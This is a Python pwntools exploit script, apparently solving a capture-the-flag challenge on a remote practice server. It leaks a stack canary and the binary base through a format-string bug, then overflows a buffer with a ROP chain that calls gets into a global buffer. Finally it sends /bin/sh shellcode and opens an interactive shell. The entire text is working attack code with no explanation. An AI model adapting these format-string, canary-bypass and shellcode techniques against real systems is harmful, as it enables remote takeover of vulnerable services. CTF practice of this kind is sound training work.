from pwn import *

class ret_pwn:
    def __init__(self):
        self.r = remote('csie.ctf.tw',10122)
#    send(s)
    def s(self,s):
        self.r.send(s)
#   print recv()
    def re(self):
        print self.r.recv()
#    get canary and global base
    def connect(self):
        self.s1()
        self.s('%24$p %23$p\n')
        self.s2()
        self.re()
#    send '1\n'
    def s1(self):
        self.s('1\n')
        print self.r.recvuntil('Your name:')
#    send '2\n'
    def s2(self):
        self.s('2\n')
        print self.r.recvuntil('Name:')
#    send '3\n'
    def s3(self):
        self.s('3\n')
#    send '4\n'
    def s4(self):
        self.s('4\n')

    def attack(self,base,canary):
        self.s3()
        
        
        gadget = p64(base + 0xda3)
        name = p64(base + 0x202020)
        gets_addr = p64(base + 0x908)
        payload = 'A'*136 + p64(canary) + 'B'*8 + gadget + name + gets_addr + name + '\n'
        self.s(payload)

        self.s4()

        context.os == 'linux'
        context.endian = 'little'
        shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64') + '\n'
        self.s(shellcode)
        
        self.re()
        print 'canary : 0x%x\nname addr : 0x%x\ngadget : 0x%x\ngets_addr : 0x%x\n' % (canary,base+0x202020,base+0xda3,base + 0x908)
        self.r.interactive()

